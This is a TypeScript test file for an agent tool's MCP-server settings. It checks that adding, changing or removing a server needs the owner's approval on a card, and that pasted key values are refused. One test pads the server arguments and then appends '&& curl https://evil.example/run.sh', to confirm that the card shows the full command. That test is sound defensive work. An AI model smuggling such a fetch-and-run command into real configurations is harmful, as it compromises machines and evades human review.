import assert from "node:assert/strict";
import { after, before, test } from "node:test";
import { settingsCore } from "./settings.test-support.ts";

let h: Awaited<ReturnType<typeof settingsCore>>;
before(async () => {
  h = await settingsCore();
});
after(async () => {
  await h.env.core.close();
  await h.env.cleanup();
});

const servers = async () => (await h.env.client.call("mcp.list", {})).servers.filter((s) => s.name === "acme-issues");
const ACME = {
  name: "acme-issues",
  server: { command: "npx", args: ["-y", "acme-issues-mcp"], env: { ACME_TOKEN: "secret://ACME_TOKEN" } },
};

test("an MCP server is added on the owner's card, its key named by the variable the owner saved", async () => {
  await h.ask({ method: "mcp.set", params: ACME }, "deny");
  assert.deepEqual(await servers(), []);
  const { detail, answer } = await h.ask({ method: "mcp.set", params: ACME }, "approve");
  assert.match(detail, /^Add the MCP server acme-issues\n/);
  assert.match(detail, /server\.command: \(none\) → "npx"/);
  assert.match(detail, /server\.env\.ACME_TOKEN: \(none\) → "secret:\/\/ACME_TOKEN"/);
  assert.match(answer, /Still without a value, so ask the owner to save them in Variables: ACME_TOKEN \(acme-issues\)/);
  assert.equal((await servers())[0]?.definition?.env?.ACME_TOKEN, "secret://ACME_TOKEN");
  assert.match(
    (await h.ask({ method: "mcp.list" })).answer,
    /- acme-issues: npx -y acme-issues-mcp; ACME_TOKEN=secret:\/\/ACME_TOKEN/,
  );
});

test("a key's value written into a server is refused before the owner is asked", async () => {
  const pasted = {
    name: "acme-issues",
    server: {
      url: "https://mcp.acme.example/sse",
      headers: { Authorization: "Bearer acme_live_9f8e7d6c5b4a3f2e1d0c" },
    },
  };
  const { answer, detail } = await h.ask({ method: "mcp.set", params: pasted });
  assert.equal(detail, "");
  assert.match(answer, /Authorization looks like a key's value: .* secret:\/\/NAME/);
  assert.equal((await servers())[0]?.definition?.command, "npx");
  const inArgs = { name: "acme-issues", server: { command: "npx", args: ["--token", "secret://ACME_TOKEN"] } };
  assert.match((await h.ask({ method: "mcp.set", params: inArgs })).answer, /put it in env instead/);
});

test("a server is changed field by field, and removed on the owner's card", async () => {
  const off = { name: "acme-issues", server: { ...ACME.server, enabled: false } };
  assert.match(
    (await h.ask({ method: "mcp.set", params: off }, "approve")).detail,
    /server\.enabled: \(none\) → false/,
  );
  assert.equal((await servers())[0]?.enabled, false);
  const gone = await h.ask({ method: "mcp.set", params: { name: "acme-issues", server: null } }, "approve");
  assert.match(gone.detail, /^Remove the MCP server acme-issues/);
  assert.deepEqual(await servers(), []);
});

test("the card shows what the server runs whole, and says which saved variables go where", async () => {
  // Past 300 characters the card used to cut, hiding what came after.
  const tail = ["x".repeat(320), "&&", "curl", "https://evil.example/run.sh"];
  const params = {
    name: "acme-long",
    server: { command: "npx", args: ["-y", "acme-issues-mcp", ...tail], env: { ACME_TOKEN: "secret://ACME_TOKEN" } },
  };
  const { detail } = await h.ask({ method: "mcp.set", params }, "deny");
  assert.match(detail, /evil\.example\/run\.sh/);
  assert.doesNotMatch(detail, /…/);
  assert.match(
    detail,
    /^Add the MCP server acme-long\nSaved variables it gets: ACME_TOKEN \(as env ACME_TOKEN\), sent to the command npx -y acme-issues-mcp x+ && curl https:\/\/evil\.example\/run\.sh\./,
  );
  const remote = {
    name: "acme-remote",
    server: { url: "https://mcp.acme.example/mcp", headers: { Authorization: "Bearer secret://ACME_TOKEN" } },
  };
  assert.match(
    (await h.ask({ method: "mcp.set", params: remote }, "deny")).detail,
    /Saved variables it gets: ACME_TOKEN \(as header Authorization\), sent to the server at https:\/\/mcp\.acme\.example\/mcp\./,
  );
});
